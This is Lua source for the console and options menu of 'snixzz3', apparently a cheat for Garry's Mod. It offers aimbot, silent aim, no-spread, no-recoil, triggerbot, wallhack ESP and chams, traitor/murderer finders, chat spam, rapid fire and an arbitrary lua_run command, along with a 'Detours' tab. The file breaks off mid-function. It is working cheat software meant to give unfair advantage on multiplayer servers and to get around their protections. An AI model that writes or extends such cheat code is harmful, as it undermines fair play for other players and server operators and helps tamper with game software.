snixzz.Cmds = {}

snixzz.CmdDesc = {

	["bind"] = "bind: proper usage: bind <key> <command>",
	["unbind"] = "unbind: proper usage: unbind <command>",
	["binds"] = "binds: Displays a list of bindable commands",
	["convars"] = "convars: Displays a list of changable convars",
	["server"] = "server: Displays server information",
	["players"] = "players: Displays a list of players & SteamIDs",
	["lua_run"] = "lua_run: Run a Lua string",
	["connect"] = "connect: Connect to the provided IP",
	["clear"] = "clear: Clears the console",
	
}

function snixzz.ConsoleCommand( str )
	
	if !snixzz.ConFrame then return end
	
	local args = G.string.Explode( " ", str )
	local cmd = args[1]
	local cmdArgs = args[2]
	
	G.table.remove( args, 1 )
	
	snixzz.AddToConsole( "] " .. str )
	
	-- Console Commands
	if snixzz.Cmds[cmd] then
		
		snixzz.Cmds[cmd]( G.LocalPlayer(), cmd, args )
		
	-- ConVars
	elseif snixzz.Bools[cmd] != nil then
		
		cmdArgs = G.tobool( cmdArgs )
		
		if cmdArgs != nil then 
		
			snixzz.Bools[cmd] = cmdArgs
			snixzz.Chat( snixzz.Colors.Green, "Set ConVar '" .. cmd .. "' to '" .. G.tostring( cmdArgs ) .. "'" )
			
		else
		
			snixzz.Chat( snixzz.Colors.Red, "Failed to set ConVar '" .. cmd .. "' to '" .. G.tostring( cmdArgs ) or "nil" )
			
		end
			
	elseif snixzz.Vars[cmd] != nil then
		
		if cmdArgs != nil then
			
			snixzz.Vars[cmd] = cmdArgs
			snixzz.Chat( snixzz.Colors,Green, "Set ConVar '" .. cmd .. "' to '" .. G.tostring( cmdArgs ) .. "'" )
			
		else
			
			snixzz.Chat( snixzz.Colors.Red, "Failed to set ConVar '" .. cmd .. "' to '" .. G.tostring( cmdArgs ) or "nil" )
			
		end
		
	elseif cmd == "lua_run" then
		
		local lua_String = G.string.gsub( str, "lua_run ", "" )
		
		snixzz.AddToConsole( "Running Lua String '" .. lua_String .. "'" )
		
		snixzz.RunString( lua_String )
		
	else
	
		snixzz.AddToConsole( "Unknown command '" .. cmd .. "'" )
		
	end
	
	snixzz.cEntry:SetText( "" )
	
end

function snixzz.AddConsoleCommand( cmd, func )

	snixzz.Cmds[cmd] = func
	
end

snixzz.AddConsoleCommand( "help", function( ply, cmd, args )

	for k, v in G.next, snixzz.Cmds do
		
		snixzz.AddToConsole( snixzz.CmdDesc[k] )
		
	end
	
end )

snixzz.AddConsoleCommand( "ping", function( ply, cmd, args )

	--if snixzz.Membership == "dev" then
	
		snixzz.PingServer( ply )
		
	--else
		
		--snixzz.AddToConsole( "You must be a developer to use this command." )
		
	--end

end )

snixzz.AddConsoleCommand( "chat", function( ply, cmd, args )

	if snixzz.ConFrame then
		
		snixzz.ConsoleOpen = false
		snixzz.ConFrame:Remove()
		
	end

	snixzz.OpenChat()

end )


snixzz.AddConsoleCommand( "say", function( ply, cmd, args )

	--if snixzz.Membership == "dev" then
	
		snixzz.SendChatMessage( ply, tostring( table.concat( args, " " ) ) )
		
	--else
		
		--snixzz.AddToConsole( "You must be a developer to use this command." )
		
	--end

end )

snixzz.AddConsoleCommand( "bind", function( ply, cmd, args )

	if !args[1] or !args[2] then snixzz.AddToConsole( snixzz.CmdDesc["bind"] ) return end

	local key = "KEY_" .. G.string.upper( args[1] )
	local cmd = args[2]
	
	snixzz.BindKey( cmd, key, true )

end )

snixzz.AddConsoleCommand( "unbind", function( ply, cmd, args )
	
	if !args[1] then snixzz.AddToConsole( "Unbind proper usage: unbind <command>" ) return end
	
	local command = args[1]
	
	snixzz.Unbind( command )
	
end )

snixzz.AddConsoleCommand( "convars", function( ply, cmd, args )
	
	for k, v in G.next, snixzz.Bools do
		
		snixzz.AddToConsole( "ConVar: " .. k .. " | Enabled: " .. G.tostring( v ) )
		
	end
	
	for k, v in G.next, snixzz.Vars do
		
		snixzz.AddToConsole( "ConVar: " .. k .. " | Value: " .. G.tostring( v ) )
		
	end

end )

snixzz.AddConsoleCommand( "binds", function( ply, cmd, args )
	
	for k, v in G.next, snixzz.Binds do
		
		snixzz.AddToConsole( "Command: " .. k .. " | Bound to: " .. G.input.GetKeyName( v )	)
		
	end
	
end )

snixzz.AddConsoleCommand( "clear", function( ply, cmd, args )
	
	if snixzz.ConFrame && snixzz.cHistory then
		
		snixzz.cHistory:Clear()
		
	end
	
	snixzz.ConsoleHistory = {}
	
	snixzz.AddToConsole( "Cleared console history." )
	
end )

snixzz.AddConsoleCommand( "connect", function( ply, cmd, args )
	
	if args[1] != nil then
	
		snixzz.AddToConsole( "Connecting to '" .. args[1] .. "'" )
		
		G.RunConsoleCommand( "connect", args[1] )
		
	else
		
		snixzz.AddToConsole( "Unknown IP" )
		
	end
	
end )

snixzz.ConsoleOpen = false

function snixzz.Console()
	
	snixzz.ConFrame = G.vgui.Create( "DFrame" )
	snixzz.ConFrame:SetSize( 700, 450 )
	snixzz.ConFrame:SetPos( 30, 30 )
	snixzz.ConFrame:SetTitle( "snixzz3 Console" )
	snixzz.ConFrame:ShowCloseButton( false )
	snixzz.ConFrame:MakePopup()
	snixzz.ConFrame.Paint = function( self ) 
	
		G.draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), snixzz.Vars["misc_menucolor2"] )
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, self:GetWide(), self:GetTall() )
		
	end
	snixzz.ConFrame.Think = function( self )
		
		if G.input.IsKeyDown( KEY_ESCAPE ) then
		
			snixzz.ConsoleOpen = false
			self:Remove()
			
		end
		
	end	
	
	local close = G.vgui.Create( "DButton", snixzz.ConFrame )
	close:SetSize( 50, 20 )
	close:SetPos( snixzz.ConFrame:GetWide() - 51, 1 )
	close:SetText( "x" )
	close:SetTextColor( G.Color( 255, 255, 255 ) )
	close:SetFont( "Trebuchet18" )
	
	close.Paint = function( self )
	
		G.draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), G.Color( 168, 62, 62, 255 ) )
	
	end
	
	close.DoClick = function()
		
		snixzz.ConsoleOpen = false
		snixzz.ConFrame:Remove()
		snixzz.Sound()
		
	end
	
	snixzz.cHistory = G.vgui.Create( "DListView", snixzz.ConFrame )
	snixzz.cHistory:SetPos( 5, 27 )
	snixzz.cHistory:SetSize( 690, 397 )
	snixzz.cHistory:SetSortable( false )
	snixzz.cHistory:AddColumn( "" )
	snixzz.cHistory:SetMultiSelect( false )

	for k, v in pairs( snixzz.ConsoleHistory ) do
		
		snixzz.cHistory:AddLine( v )
		
	end
	
	snixzz.cHistory.OnClickLine = function( prnt, line, self )
	
		G.SetClipboardText( line:GetValue( 1 ) )
		
		snixzz.Chat( snixzz.Colors.Green, "Copied selected line to clipboard.", true )
		
	end
	
	snixzz.cHistory:PerformLayout()
	snixzz.cHistory.VBar:SetScroll( snixzz.cHistory.VBar.CanvasSize )
	
	-- command entry
	snixzz.cEntry = G.vgui.Create( "DTextEntry", snixzz.ConFrame )
	snixzz.cEntry:SetMultiline( false )
	snixzz.cEntry:SetSize( 690, 20 )
	snixzz.cEntry:SetPos( 5, 427 )
	
	snixzz.cEntry.OnEnter = function( self )
		
		snixzz.ConsoleCommand( self:GetValue() )
		
	end
	
	snixzz.cEntry.Think = function( self )
		
		self:RequestFocus()
		
	end
	
end

snixzz.MenuToggle = false

function snixzz.DoMenuToggle()
	
	snixzz.MenuOpen = true
	snixzz.Frame:SetVisible( true )
	
end

function snixzz.Menu()

	local tabs, menuheight, menuwidth, w, h = {}, 430, 420, ScrW() / 2, ScrH() / 2
	
	snixzz.Frame = G.vgui.Create( "DPropertySheet" )
	snixzz.Frame:SetParent( snixzz.Frame )
	snixzz.Frame:SetPos( 20, 80 )
	snixzz.Frame:SetSize( menuwidth, menuheight )
	snixzz.Frame:SetVisible( true )
	snixzz.Frame:MakePopup()
	snixzz.Frame.Think = function()
		
		if snixzz.Binds["+menu"] == nil then return end
		
		if !G.input.IsKeyDown( snixzz.Binds["+menu"] ) && !snixzz.MenuToggle then
		
			snixzz.MenuOpen = false
			//snixzz.Changelog:SetVisible( false )
			//snixzz.LinksButton:SetVisible( false )
			snixzz.Frame:SetVisible( false )
			
		end
		
	end	
	snixzz.Frame.Paint = function() 
		
		G.draw.RoundedBox( 0, 0, 30, snixzz.Frame:GetWide(), snixzz.Frame:GetTall(), snixzz.Vars["misc_menucolor"] )
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, snixzz.Frame:GetWide(), snixzz.Frame:GetTall() )
		
	end
	
	-- Menu Toggle button
	local Toggle = G.vgui.Create( "DButton" )
	Toggle:SetParent( snixzz.Frame )
	Toggle:SetText( "Hold Open" )
	Toggle:SetTextColor( snixzz.Colors.Green )
	Toggle:SetPos( 0, 0 )
	Toggle:SetPos( snixzz.Frame:GetWide() - 60, 0 )
	Toggle:SetSize( 60, 30 )
	Toggle.DoClick = function()
		
		snixzz.MenuToggle = !snixzz.MenuToggle
		snixzz.DoMenuToggle()
		
		if snixzz.MenuToggle == true then
			
			Toggle:SetText( "Close" )
			Toggle:SetTextColor( Color( 255, 255, 0 ) )
			snixzz.Sound()
			
		else
			
			Toggle:SetText( "Hold Open" )
			Toggle:SetTextColor( snixzz.Colors.Green )
			snixzz.Sound()
			
		end
		
	end
	Toggle.Paint = function() 
		
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, Toggle:GetWide(), Toggle:GetTall() )
		
	end

	/*snixzz.LinksButton = G.vgui.Create( "DButton" )
	snixzz.LinksButton:SetText( "Links" )
	snixzz.LinksButton:SetPos( snixzz.Frame:GetWide() - 205, 60 )
	snixzz.LinksButton:SetSize( 35, 18 )
	snixzz.LinksButton:SetFont( "snixzz_logo_small" )
	snixzz.LinksButton:SetTextColor( color_white )
	
	snixzz.LinksButton.DoClick = function()
		
		if !snixzz.linksMenu then
		
			snixzz.Sound()
			snixzz.OpenLinksMenu()
			
		end
		
	end
	snixzz.LinksButton.Paint = function() 
		
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, snixzz.LinksButton:GetWide(), snixzz.LinksButton:GetTall() )
		
	end*/

	-- Parents for the tabs
	tabs.aimbot = G.vgui.Create( "DLabel", snixzz.Frame )
	tabs.aimbot:SetPos( 0, 0 )
	tabs.aimbot:SetText( "" )

	tabs.esp = G.vgui.Create( "DLabel", snixzz.Frame )
	tabs.esp:SetPos( 0, 0 )
	tabs.esp:SetText( "" )

	tabs.misc = G.vgui.Create( "DLabel", snixzz.Frame )
	tabs.misc:SetPos( 0, 0 )
	tabs.misc:SetText( "" )
	
	tabs.lists = G.vgui.Create( "DLabel", snixzz.Frame )
	tabs.lists:SetPos( 0, 0 )
	tabs.lists:SetText( "" )

	tabs.log = G.vgui.Create( "DLabel", snixzz.Frame )
	tabs.log:SetPos( 0, 0 )
	tabs.log:SetText( "" )

	tabs.config = G.vgui.Create( "DLabel", snixzz.Frame )
	tabs.config:SetPos( 0, 0 )
	tabs.config:SetText( "" )
	
	snixzz.Frame:AddSheet( "Aimbot", tabs.aimbot, "icon16/lightning.png", false, false )
	snixzz.Frame:AddSheet( "Visual", tabs.esp, "icon16/eye.png", false, false )
	snixzz.Frame:AddSheet( "Misc", tabs.misc, "icon16/plugin.png", false, false )
	snixzz.Frame:AddSheet( "Lists", tabs.lists, "icon16/user_add.png", false, false )
	snixzz.Frame:AddSheet( "Detours", tabs.log, "icon16/application_xp_terminal.png", false, false )
	snixzz.Frame:AddSheet( "Config", tabs.config, "icon16/wrench.png", false, false )

	-- Aimbot Settings
	snixzz.CreateOption( "Checkbox", tabs.aimbot, "Aimbot Toggle", "aim_toggle", 5, 5 )
	snixzz.CreateOption( "Checkbox", tabs.aimbot, "Autoshoot", "aim_autoshoot", 5, 25 )
	snixzz.CreateOption( "Checkbox", tabs.aimbot, "Silent Aim", "aim_silent", 5, 45 )
	snixzz.CreateOption( "Checkbox", tabs.aimbot, "Spread Prediction", "aim_nospread", 5, 65 )
	snixzz.CreateOption( "Checkbox", tabs.aimbot, "Aim Prediction", "aim_prediction", 5, 85 )
	snixzz.CreateOption( "Checkbox", tabs.aimbot, "Remove Recoil", "aim_norecoil", 5, 105 )
	snixzz.CreateOption( "Checkbox", tabs.aimbot, "Miss random shots", "aim_badshots", 5, 125 )	
	snixzz.CreateOption( "Checkbox", tabs.aimbot, "Hold Target", "aim_holdtarget", 5, 145 )	
	
	snixzz.CreateOption( "Checkbox", tabs.aimbot, "Ignore Team", "aim_ignoreteam", 130, 5 )
	snixzz.CreateOption( "Checkbox", tabs.aimbot, "Ignore Admins", "aim_ignoreadmins", 130, 25 )
	snixzz.CreateOption( "Checkbox", tabs.aimbot, "Ignore Steam Friends", "aim_ignoresteam", 130, 45 )
	snixzz.CreateOption( "Checkbox", tabs.aimbot, "Ignore Bots", "aim_ignorebots", 130, 65 )
	snixzz.CreateOption( "Checkbox", tabs.aimbot, "Ignore LOS", "aim_ignorelos", 130, 85 )
	snixzz.CreateOption( "Checkbox", tabs.aimbot, "Ignore Friends", "aim_ignorefriends", 130, 105 )
	snixzz.CreateOption( "Checkbox", tabs.aimbot, "Ignore Friendly Traitors", "aim_ignoretraitors", 130, 125 )
	snixzz.CreateOption( "Checkbox", tabs.aimbot, "Target Only Traitors", "aim_onlytraitors", 130, 145 )
	
	snixzz.CreateOption( "Checkbox", tabs.aimbot, "Anti Anti-Aim", "aim_antiantiaim", 275, 5 )
	snixzz.CreateOption( "Checkbox", tabs.aimbot, "Anti-Aim", "aim_anti", 275, 25 )

	snixzz.CreateOption( "Slider", tabs.aimbot, "Spinbot Speed", "aim_anti_spin_speed", 10, 50, 420, 5, 325, 0 )
	snixzz.CreateOption( "Slider", tabs.aimbot, "Field of View", "aim_fov", 1, 180, 420, 5, 345, 0 )
	snixzz.CreateOption( "Slider", tabs.aimbot, "Aimspot Offset", "aim_offset", -20, 20, 425, 5, 365, 0 )
	
	
	snixzz.CreateOption( "Label", tabs.aimbot, "Prediction Method", 115, 250 )
	
	local PredictionMethod = G.vgui.Create( "DComboBox", tabs.aimbot )
	PredictionMethod:SetPos( 115, 265 )
	PredictionMethod:SetSize( 105, 20 )
	PredictionMethod:SetText( snixzz.Vars["aim_prediction_method"] )
	PredictionMethod:SetTextColor( color_white )
	
	for k, v in G.next, snixzz.PredictionMethods do
		
		PredictionMethod:AddChoice( v )
		
	end
	
	PredictionMethod.OnSelect = function( self )
		
		snixzz.Vars["aim_prediction_method"] = self:GetValue()
		snixzz.Chat( Color( 0, 255, 255 ), "Set prediction method to '" .. self:GetValue() .. "'" )
		snixzz.Sound()
		
	end	
	
	PredictionMethod.Paint = function() 
		
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, PredictionMethod:GetWide(), PredictionMethod:GetTall() )
		
	end
	
	snixzz.CreateOption( "Label", tabs.aimbot, "Target Type", 225, 250 )
	
	local TargetType = G.vgui.Create( "DComboBox", tabs.aimbot )
	TargetType:SetPos( 225, 265 )
	TargetType:SetSize( 105, 20 )
	TargetType:SetText( snixzz.Vars["aim_target_type"] )
	TargetType:SetTextColor( color_white )
	
	for k, v in G.next, { "Players", "NPC", "Both" } do
		
		TargetType:AddChoice( v )
		
	end
	
	TargetType.OnSelect = function( self )
		
		snixzz.Vars["aim_target_type"] = self:GetValue()
		snixzz.Chat( Color( 0, 255, 255 ), "Set target type to '" .. self:GetValue() .. "'" )
		snixzz.Sound()
		
	end	
	
	TargetType.Paint = function() 
		
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, TargetType:GetWide(), TargetType:GetTall() )
		
	end
	
	// AntiAim Method
	snixzz.CreateOption( "Label", tabs.aimbot, "Anti-Aim Method", 5, 250 )
	local AntiAimMethod = G.vgui.Create( "DComboBox", tabs.aimbot )
	AntiAimMethod:SetPos( 5, 265 )
	AntiAimMethod:SetSize( 105, 20 )
	AntiAimMethod:SetText( snixzz.Vars["aim_anti_method"] )
	AntiAimMethod:SetTextColor( color_white )
	
	for k, v in G.next, snixzz.AntiAimMethods do
		
		AntiAimMethod:AddChoice( v )
		
	end
	
	AntiAimMethod.OnSelect = function( self )
		
		snixzz.Vars["aim_anti_method"] = self:GetValue()
		snixzz.Chat( Color( 0, 255, 255 ), "Set anti-aim method to '" .. self:GetValue() .. "'" )
		snixzz.Sound()
		
	end
	
	AntiAimMethod.Paint = function() 
		
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, AntiAimMethod:GetWide(), AntiAimMethod:GetTall() )
		
	end

	-- Aimbot hitbox/bone method & spot selection
	snixzz.CreateOption( "Label", tabs.aimbot, "Aimbot Method", 5, 290 )

	local AimbotMethod = G.vgui.Create( "DComboBox", tabs.aimbot )
	AimbotMethod:SetPos( 5, 305 )
	AimbotMethod:SetSize( 105, 20 )
	AimbotMethod:SetText( snixzz.Vars["aim_method"] )
	AimbotMethod:AddChoice( "Hitbox" )
	AimbotMethod:AddChoice( "Bone" )
	AimbotMethod:AddChoice( "Hitscan" )
	AimbotMethod:SetTextColor( color_white )
	AimbotMethod.OnSelect = function( self )
		
		snixzz.Vars["aim_method"] = self:GetValue()
		snixzz.Chat( Color( 0, 255, 255 ), "Set aimbot method to '" .. self:GetValue() .. "'" )
		snixzz.Sound()
		
		 -- Close to menu to avoid bugs.
		snixzz.Frame:SetVisible( false )
		//snixzz.Changelog:SetVisible( false )
		//snixzz.LinksButton:SetVisible( false )
		snixzz.MenuOpen = false
		snixzz.MenuToggle = false
		
	end
	
	AimbotMethod.Paint = function() 
		
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, AimbotMethod:GetWide(), AimbotMethod:GetTall() )
		
	end
	
	-- Aimspot & aim method selection
	snixzz.CreateOption( "Label", tabs.aimbot, "Aim Spot", 115, 290 )
	
	local Aimspot = G.vgui.Create( "DComboBox", tabs.aimbot )
	Aimspot:SetPos( 115, 305 )
	Aimspot:SetSize( 105, 20 )
	Aimspot:SetTextColor( color_white )
	
	if snixzz.Vars["aim_method"] == "Hitbox" then
		
		Aimspot:SetText( snixzz.Vars["aim_hitbox"] )
		
		Aimspot:SetDisabled( false )
		
		for k, v in G.next, snixzz.Hitboxes do
			
			Aimspot:AddChoice( k )
			
		end
		
	elseif snixzz.Vars["aim_method"] == "Bone" then
	
		Aimspot:SetText( snixzz.Vars["aim_bone"] )
		
		Aimspot:SetDisabled( false )
		
		for k, v in G.next, snixzz.Bones do
			
			Aimspot:AddChoice( k )
			
		
		end
		
	elseif snixzz.Vars["aim_method"] == "Hitscan" then
	
		Aimspot:SetText( "Auto" )
		Aimspot:SetDisabled( true )
		
	end
	
	Aimspot.OnSelect = function( self )
		
		if snixzz.Vars["aim_method"] == "Hitbox" then
		
			snixzz.Vars["aim_hitbox"] = self:GetValue()
			snixzz.Chat( Color( 0, 255, 255 ), "Set aimbot hitbox to '" .. self:GetValue() .. "'" )
			
		elseif snixzz.Vars["aim_method"] == "Bone" then
		
			snixzz.Vars["aim_bone"] = self:GetValue()
			snixzz.Chat( Color( 0, 255, 255 ), "Set aimbot bone to '" .. self:GetValue() .. "'" )

		end
		
		snixzz.Sound()
	end
	
	Aimspot.Paint = function() 
		
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, Aimspot:GetWide(), Aimspot:GetTall() )
		
	end
	
	// Target method
	snixzz.CreateOption( "Label", tabs.aimbot, "Target Method", 225, 290 )
	
	local TargetMethod = G.vgui.Create( "DComboBox", tabs.aimbot )
	TargetMethod:SetPos( 225, 305 )
	TargetMethod:SetSize( 105, 20 )
	TargetMethod:SetText( snixzz.Vars["aim_target_method"] )
	TargetMethod:SetTextColor( color_white )
	TargetMethod:AddChoice( "Distance" )
	TargetMethod:AddChoice( "Crosshair" )
	TargetMethod.OnSelect = function( self )
	
		snixzz.Vars["aim_target_method"] = self:GetValue()
		snixzz.Chat( Color( 0, 255, 255 ), "Set target method to '" .. self:GetValue() .. "'" )
		snixzz.Sound()
		
	end	
	
	TargetMethod.Paint = function() 
	
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, TargetMethod:GetWide(), TargetMethod:GetTall() )
		
	end

	-- Visual Settings
	snixzz.CreateOption( "Checkbox", tabs.esp, "Enable Visuals", "esp_enabled", 5, 5 )
	snixzz.CreateOption( "Checkbox", tabs.esp, "Name Text", "esp_name", 5, 45 )
	snixzz.CreateOption( "Checkbox", tabs.esp, "Health Text", "esp_health_text", 5, 65 )
	snixzz.CreateOption( "Checkbox", tabs.esp, "Weapon Text", "esp_weapon", 5, 85 )
	snixzz.CreateOption( "Checkbox", tabs.esp, "Distance Text", "esp_distance", 5, 105 )
	snixzz.CreateOption( "Checkbox", tabs.esp, "Bounding Box", "esp_box", 5, 125 )
	snixzz.CreateOption( "Checkbox", tabs.esp, "Chams", "esp_chams", 5, 145 )
	snixzz.CreateOption( "Checkbox", tabs.esp, "Health Bar", "esp_health_bar", 5, 165 )
	snixzz.CreateOption( "Checkbox", tabs.esp, "Hitbox ESP", "esp_hitbox", 5, 185 )

	snixzz.CreateOption( "Checkbox", tabs.esp, "Crosshair", "esp_crosshair", 130, 5 )
	snixzz.CreateOption( "Checkbox", tabs.esp, "Crosshair Box", "esp_crosshair_box", 130, 25 )
	snixzz.CreateOption( "Checkbox", tabs.esp, "Remove Hands", "esp_nohands", 130, 45 )
	snixzz.CreateOption( "Checkbox", tabs.esp, "Aimbot Status", "esp_status", 130, 65 )
	snixzz.CreateOption( "Checkbox", tabs.esp, "Laser Sights", "esp_laser", 130, 85 )
	snixzz.CreateOption( "Checkbox", tabs.esp, "Aim Snaplines", "esp_snaplines", 130, 105 )
	snixzz.CreateOption( "Checkbox", tabs.esp, "Dynamic Light", "esp_dynamiclight", 130, 125 )
	snixzz.CreateOption( "Checkbox", tabs.esp, "Wireframe Weapon", "esp_wireweapon", 130, 145 )
	snixzz.CreateOption( "Checkbox", tabs.esp, "Draw Aimbot Position", "esp_aimpos", 130, 165 )	
	snixzz.CreateOption( "Checkbox", tabs.esp, "ASUS Walls", "esp_asus_walls", 130, 185 )	
	snixzz.CreateOption( "Checkbox", tabs.esp, "RGB Mode", "esp_rainbow", 130, 205 )	

	snixzz.CreateOption( "Slider", tabs.esp, "Field of View", "esp_fov", 90, 140, 420, 5, 325, 1 )
	snixzz.CreateOption( "Slider", tabs.esp, "Box Width", "esp_box_width", 1, 2.5, 420, 5, 345, 1 )
	snixzz.CreateOption( "Slider", tabs.esp, "Render Distance", "esp_distance", 0, 7500, 415, 5, 365, 0 )

	
	snixzz.CreateOption( "Label", tabs.esp, "Chams Material", 5, 290 )
	
	local ChamsType = G.vgui.Create( "DComboBox", tabs.esp )
	ChamsType:SetPos( 5, 305 )
	ChamsType:SetSize( 105, 20 )
	ChamsType:SetText( snixzz.Vars["esp_chams_material"] )
	ChamsType:AddChoice( "Solid" )
	ChamsType:AddChoice( "Wireframe" )
	ChamsType:AddChoice( "XQZ" )
	ChamsType:SetTextColor( color_white )
	ChamsType.OnSelect = function( self )
	
		snixzz.Vars["esp_chams_material"] = self:GetValue()
		snixzz.Chat( Color( 0, 255, 255 ), "Set chams material to '" .. self:GetValue() .. "'" )
		snixzz.Sound()
		
	end
	
	ChamsType.Paint = function() 
	
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, ChamsType:GetWide(), ChamsType:GetTall() )
		
	end
	
	snixzz.CreateOption( "Label", tabs.esp, "ESP Type", 115, 290 )
	
	local ESPType = G.vgui.Create( "DComboBox", tabs.esp )
	ESPType:SetPos( 115, 305 )
	ESPType:SetSize( 105, 20 )
	ESPType:SetText( snixzz.Vars["esp_type"] )
	ESPType:AddChoice( "Players" )
	ESPType:AddChoice( "NPC" )
	ESPType:AddChoice( "Entities" )
	ESPType:AddChoice( "All" )
	ESPType:SetTextColor( color_white )
	ESPType.OnSelect = function( self )
	
		snixzz.Vars["esp_type"] = self:GetValue()
		snixzz.Chat( Color( 0, 255, 255 ), "Set ESP type to '" .. self:GetValue() .. "'" )
		snixzz.Sound()
		
	end
	
	ESPType.Paint = function() 
	
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, ESPType:GetWide(), ESPType:GetTall() )
		
	end
	
	--------------
	-- Misc tab --
	--------------
	snixzz.CreateOption( "Checkbox", tabs.misc, "Bunnyhop", "misc_bhop", 5, 5 )
	snixzz.CreateOption( "Checkbox", tabs.misc, "Autostrafe", "misc_autostrafe", 5, 25 )
	snixzz.CreateOption( "Checkbox", tabs.misc, "Triggerbot", "misc_triggerbot", 5, 45 )
	snixzz.CreateOption( "Checkbox", tabs.misc, "Triggerbot NoSpread", "misc_triggerbot_nospread", 5, 65 )
	snixzz.CreateOption( "Checkbox", tabs.misc, "Thirdperson", "misc_thirdperson", 5, 85 )
	snixzz.CreateOption( "Checkbox", tabs.misc, "Traitor Finder", "misc_traitor_finder", 5, 105 )
	snixzz.CreateOption( "Checkbox", tabs.misc, "Murder Finder", "misc_murder_finder", 5, 125 )
	snixzz.CreateOption( "Checkbox", tabs.misc, "Prophunt Finder", "misc_prophunt_finder", 5, 145 )
	snixzz.CreateOption( "Checkbox", tabs.misc, "Chat Spam", "misc_chat_spam", 5, 165 )
	snixzz.CreateOption( "Checkbox", tabs.misc, "Rapid Fire", "misc_rapidfire", 5, 185 )
	snixzz.CreateOption( "Checkbox", tabs.misc, "Clientside Noclip [Beta]", "misc_csnoclip", 5, 205 )
	snixzz.CreateOption( "Slider", tabs.misc, "Thirdperson Distance", "misc_thirdperson_distance", 50, 180, 415, 5, 345, 1 )

	snixzz.CreateOption( "Label", tabs.misc, "Triggerbot Method", 5, 290 )
	
	local Trigmethod = G.vgui.Create( "DComboBox", tabs.misc )
	Trigmethod:SetPos( 5, 305 )
	Trigmethod:SetSize( 105, 20 )
	Trigmethod:SetText( snixzz.Vars["misc_triggerbot_method"] )
	Trigmethod:AddChoice( "Body" )
	Trigmethod:AddChoice( "Hitbox" )
	Trigmethod:SetTextColor( color_white )
	Trigmethod.OnSelect = function( self )
	
		snixzz.Vars["misc_triggerbot_method"] = self:GetValue()
		snixzz.Chat( Color( 0, 255, 255 ), "Set triggerbot method to '" .. self:GetValue() .. "'" )
		snixzz.Sound()
		
	end
	Trigmethod.Paint = function() 
		
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, Trigmethod:GetWide(), Trigmethod:GetTall() )
		
	end	
	
	snixzz.CreateOption( "Label", tabs.misc, "Triggerbot Type", 115, 290 )
	
	local TrigType = G.vgui.Create( "DComboBox", tabs.misc )
	TrigType:SetPos( 115, 305 )
	TrigType:SetSize( 105, 20 )
	TrigType:SetText( snixzz.Vars["misc_triggerbot_type"] )
	TrigType:AddChoice( "Players" )
	TrigType:AddChoice( "NPC" )
	TrigType:AddChoice( "Both" )
	TrigType:SetTextColor( color_white )
	TrigType.OnSelect = function( self )
	
		snixzz.Vars["misc_triggerbot_type"] = self:GetValue()
		snixzz.Chat( Color( 0, 255, 255 ), "Set triggerbot type to '" .. self:GetValue() .. "'" )
		snixzz.Sound()
		
	end
	TrigType.Paint = function() 
		
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, TrigType:GetWide(), TrigType:GetTall() )
		
	end		
	
	snixzz.CreateOption( "Label", tabs.misc, "Chat Spam Method", 225, 290 )

	local SpamMethod = G.vgui.Create( "DComboBox", tabs.misc )
	SpamMethod:SetPos( 225, 305 )
	SpamMethod:SetSize( 105, 20 )
	SpamMethod:SetText( snixzz.Vars["misc_chat_spam_method"] )
	SpamMethod:AddChoice( "Advertise" )
	SpamMethod:AddChoice( "Jokes" )
	SpamMethod:SetTextColor( color_white )
	SpamMethod.OnSelect = function( self )
	
		snixzz.Vars["misc_chat_spam_method"] = self:GetValue()
		snixzz.Chat( Color( 0, 255, 255 ), "Set chat spam method to '" .. self:GetValue() .. "'" )
		snixzz.Sound()
		
	end
	
	SpamMethod.Paint = function() 
		
		G.surface.SetDrawColor( Color( 0, 0, 0 ) )
		G.surface.DrawOutlinedRect( 0, 0, SpamMethod:GetWide(), SpamMethod:GetTall() )
		
	end	
	
	---------------
	-- Lists Tab --
	---------------
	
	-- Friends/enemies
	
	local Enemies = G.vgui.Create( "DListView", tabs.lists )
	Enemies:SetPos( 5, 5 )
	Enemies:SetSize( 170, 180 )
	Enemies:AddColumn( "Enemies" )
	
	for k, v in G.next, G.player.GetAll() do
		
		if !snixzz.Friends[v:Nick()] && v != G.LocalPlayer() then
			
			Enemies:AddLine( v:Nick() )
			
		end
		
	end
	
	local Friends = G.vgui.Create( "DListView", tabs.lists )
	Friends:SetPos( 230, 5 )
	Friends:SetSize( 170, 180 )
	Friends:AddColumn( "Friends" )
	
	for k, v in G.next, snixzz.Friends do
		
		Friends:AddLine( k )
		
	end
	
	local AddFriend = G.vgui.Create( "DButton", tabs.lists ) 
	AddFriend:SetText( "-->" ) 
	AddFriend:SetSize( 30, 20 )
	AddFriend:SetPos( 187.5, 140 )
	AddFriend:SetTextColor( color_white )
	AddFriend.DoClick = function() 
	
	local line = Enemies:GetSelectedLine()
		
		if line != nil then 
			
			local ply = Enemies:GetLine( line ):GetValue(1)  
			
			if !snixzz.Friends[ply] then
				
				snixzz.Friends[ply] = true
				snixzz.Chat( snixzz.Colors.Green, "Added '" .. ply .. "' to friends list." )
				Friends:AddLine( ply ) 
